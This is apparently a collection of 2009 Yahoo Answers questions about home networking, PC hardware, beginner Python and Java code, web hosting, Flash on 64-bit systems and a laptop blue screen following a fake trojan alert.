20090128183503AAFU5bw	Computers & Internet;Computer Networking	Windows XP Pro networking questions?	Here is the situation. Each computer has a static IP address for simplicity sake.      One computer is at building number 1 where the connection to the ISP arrives. At that building the connection splits in a Router (D-Link WBR2310) where it's transmitted wirelessly over to the house about 1km away.      Within the house the connection come in via a wireless network bridge (EnGenius) where it's output is fed to a second wireless router (D-Link DI-524). From here the internet is fed to two computers via Cat 5 cable and two laptops via wireless. No firewalls are enabled on any of the household computers, nor at building 1.      Connection strength and quality are consistent and good, no dropouts or other complaints for many months ever since set up.      My questions:   1) If I were to let the computers connect via DHCP, how could I uniquely identify them on the network so other users could share files within the house and at the building 1?      2) File and print sharing. From the computers in the house via Network browser, it is impossible to "see" the computer over at building number one. Network browser shows computers which are behind the DI-524 only.      The only scheme which lets users access and transfer files to/from that solitary computer is Remote Desktop (which works just fine).      I'd like to refine this network so DHCP is the rule and so all Windows file and print sharing protocols work seamlessly through the wireless.      The DI-524 seems to be preventing this and even when I set up DMZ for any specific computer's static IP address, I still cannot overcome some kind of blockage of Windows file and print sharing.

My computer was acting much better. But then all of a sudden when I typed online everything I typed wouldn't go in and it would skip letters. On facebook instead of my password being displayed as black dots it would display the letters and numbers. When I hit enter it would tell me my password is incorrect even though I know it isn't and it would always work the second time. My youtube videos would load but would never start except for one video I found played without a problem which I found to be very strange. Finally on every myspace page the music player would be replaced by a Beastie Boys music video.

I created my Facebook account last week, I have 6 friends ( 3 guys and 3 girls), and I was checking the list of friends of my friends, and lists of members of certain groups that I joined, and I wanted to add some girls (and I sent them a message " Hi, I've seen your profile on this group, I am a new member and I would be glad to get to know you better...If you want, we could discuss, why not? ..See you later, bye" )   And unfortunately, none of those girls accepted my friendship, and they ignored my message...   So, I am worried , do they ignore me because they don't know me, or simply because they don't like my picture or/and my message?   Can you advise me, plz?   Is it wrong to contact people that I don't know?   I thought Facebook was a site that helped people to meet up and become friends (and maybe more than friends, if there is mutual attraction,of course...)      What do you think?      Thanks

I am looking to start a website of my own which I can put videos on, sell my training DVDs though, and put other info on in hopes that I get a job.      I was told from a friend that Bluehost.com was good and it is but I don't want to pay $7 a month.  Free hosts are out there but I don't want an ad filled page either.      I then heard about hosting a website off a home computer.  I have a spare PC laying around and would like that to be my "server".  the power hardly goes out and we have quick internet so site down time should hardly come up.

I have Adobe CS3 Masters collection which offers some website design software so if anyone knows of any good ones for beginners out of that pack please speak up.      I've never done a real website before but have a good idea of some layouts I did in Photoshop CS3 Extended.  Any tips and advice would be great.      Thanks   Dave,   Sonic Orb Studios

20090128144914AAd33jv	Computers & Internet;Hardware;Other - Hardware	I am buying a new computer and...?	...I have the option to choose a dual-DVI video card or a VGA\DVI.      they are nVidia GeForce 9400GT 1GB...dual-dvi or vga\dvi..      I have two monitors that I want to connect to one of these cards(for dual monitor display), the only problem is that they both only support VGA. If I get two VGA-to-DVI converters will it degrade any video quality when connected? Should I choose the video card with a VGA\DVI and instead just get one VGA-to-DVI?      The two monitors I have are Dell...and pretty old..older than 4 or 5 years. One is LCD and the other is CRT.      What is the best option?

20090128145441AAoFg96	Computers & Internet;Programming & Design	Deploy Eclipse Web Services Project to Tomact?	Hi,       I have developed my first web service. It works fine with Tomcat within my Eclipse IDE and the web service client within  Eclipse can connect fine and so on.       The service is a particular class name specified by my 'service provider'. The provider will send notifications to my webservice, it expects it to be the name of this class. The majority of the project is standard java classes processing the received messages and storing in a MySQL database. The Eclipse project is called 'mywebservice' and the web service class itself has another name, it's just a very simple java class that I exposed as a service using Eclipse/Axis2. I want to deploy this web service to a live Tomcat server (running on my laptop).       I am unsure how to do this. Export>war exports a war file with the same name of my project. I can then browse from Tomcat, import and deploy this service. but if I click on teh service it get brought to an error page.       Also, the java project had a lot of dependencies on jar files. Do these get exported or do I have to manually deploy/copy these to my Tomcat server?       Thanks for reading,    BG

20090128163208AAST3mm	Computers & Internet;Software	What does this adobe thing mean?	Flash Player support on 64-bit operating systems   Issue   Adobe Flash Player is not supported for playback in a 64-bit browser. However, you can run Flash Player in a 32-bit browser running on a 64-bit operating system.         Reason   Adobe is working on Flash Player support for 64-bit platforms as part of our ongoing commitment to the cross-platform compatibility of Flash Player. We expect to provide native support for 64-bit platforms in an upcoming release of Flash Player following Flash Player 10.         Solution   To use Flash Player to view Flash content on a 64-bit operating system, you must run a 32-bit browser.

(ie: would a new print head every 4 or 5 months be needed ?) also would there be a difference in print quality... if i where to use a standard A4 inkjet with bottle fed ink... but running solvent ink rather than the normal would it print the same or is there a difference in the thickness of the ink and so on??      any help greatly recieved!!!

I created a loop that would ask the user what he would like to do. Upon choosing the option the user would move from loop==1 to loop==2. Upon moving to loop 2 the user would be prompted another menu and one of the options stated "back to main menu". In the programming  i put    elif choice==5:               loop=1      for some reason though when i run the program, it works fine until the point where i try to go back to the main menu. It seems as if it won't rerun the loop. Here is my code, maybe there is an error i can't see.      while loop==4:    choice=menu1()    if choice==1:     print "calculator initiated"     print " "     loop=5    if choice==2:     print "game initiated"     print " "     loop=6    if choice==3:     print "exiting"     loop=0      while loop == 5:    choice = menu2()    if choice == 1:     add(input("Add this: "),input("to this: "))    elif choice == 2:     sub(input("Subtract this: "),input("from this: "))    elif choice == 3:     mul(input("Multiply this: "),input("by this: "))    elif choice == 4:     div(input("Divide this: "),input("by this: "))    elif choice==5:        # <------ redirects user to loop 4     loop=4    elif choice == 6:     loop = 0      for some reason i can go from loop 4 to five, but not back to 4.

20090128190026AAyh6mU	Computers & Internet;Hardware;Laptops & Notebooks	Blue screen of death followed by reboot?	Earlier today my computer told me I had a trojan called something like "Kafi" something via the Windows Firewall program and told me to download some program to fix it. Normally I would not fall for that but since it was through the windows program I figured it was trustworthy. However before I even downloaded the program my Internet Explorer was having persistent "unexpected errors." I packed up my laptop cuz I was going home but merely shut thelid which usually puts it into hibernation, though apparently my computer froze before putting it in in the laptop bag so it was sitting in the bag turned on getting really hot. Now when I turn on my computer it gets passed the sony vaio welcome screen then gives me the various options for safe mode, "last good configuration" and normal. Then it goes to the windows screen, but before it gets to the log on screen, a blue screen flashes and the machine immediately reboots. I'm not sure if this has to do with the virus, the program i installed, or the temperature. Any ideas?

SWITCH     switch (chosen)     {      case 0:       if (?????? = equation1)                 monthlyinterestrate = .0535/12;       totalmonths = 7*12;                 amortizationchart_textarea.setText... \n");       amortizationchart_textarea.append(... + equation1);              break; //ends case 0 so that it will not try to compute case 1 and case 2 without action           case 1:       if (?????? = equation1)   .........................................      Hopefully this provides enough information to get some help.  I would appreciate any words of wisdom, thanks in advance!

We consistenly have connection problems at my apartment complex and the connection went out again this evening. However, one of my friends who is over at the apartment is still able to connect.       The three computers which aren't connecting are my own, which is a Dell Inspiron 1521, running Windows Vista on an AMD Turion processor; a Dell Inspiron 6000, running Windows XP on an Intel processor; and MacBook. The one computer which is connecting to the internet is an HP Pavilion, running Windows Vista on an AMD Turion processor.      I'm fairly certain the problem isn't the manufacturer, since both Dells and the Apple aren't connecting; I don't think it's the processor and if it's the connection, why is it working on one computer?      Any ideas? Thanks all.

Also, when it's kept on the bed for half an hour or so, it over heats and turns off. Any ideas on what I can do?
